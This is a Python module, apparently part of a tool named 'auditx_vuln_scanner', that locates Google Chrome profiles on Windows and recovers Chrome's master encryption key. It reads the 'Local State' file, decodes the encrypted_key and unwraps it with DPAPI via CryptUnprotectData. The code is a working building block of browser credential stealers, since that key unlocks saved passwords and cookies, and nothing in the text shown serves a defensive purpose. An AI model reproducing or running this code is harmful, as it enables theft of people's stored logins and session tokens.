import os
import sys
import json
import base64
import win32crypt
import auditx_vuln_scanner.models.registry as models

def get_chrome_installation():
    if sys.platform == "win32":
        app_data_dir = os.getenv("LOCALAPPDATA")
        chrome_dir = os.path.join(app_data_dir, "Google", "Chrome", "User Data")
        if os.path.exists(chrome_dir):
            profiles = [directory_item for directory_item in os.listdir(chrome_dir) if directory_item.startswith("Profile") or directory_item == "Default"]
            if len(profiles) > 0:
                master_password = get_chrome_master_password(os.path.join(chrome_dir, "Local State"))
                if master_password:
                    return models.BROWSER_INSTALLATION(profiles=profiles, installation_directory=chrome_dir, master_password=master_password, browser_name="Google Chrome")
    return None

def get_chrome_master_password(local_state_path):
    with open(local_state_path, 'r') as local_state_file:
        try:
            local_state = json.load(local_state_file)
            encrypted_key = base64.b64decode(local_state.get('os_crypt', {}).get('encrypted_key'))[5:]
            return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        except Exception as error:
            print(f"[Error] error getting chrome master password: {error}")
            return None

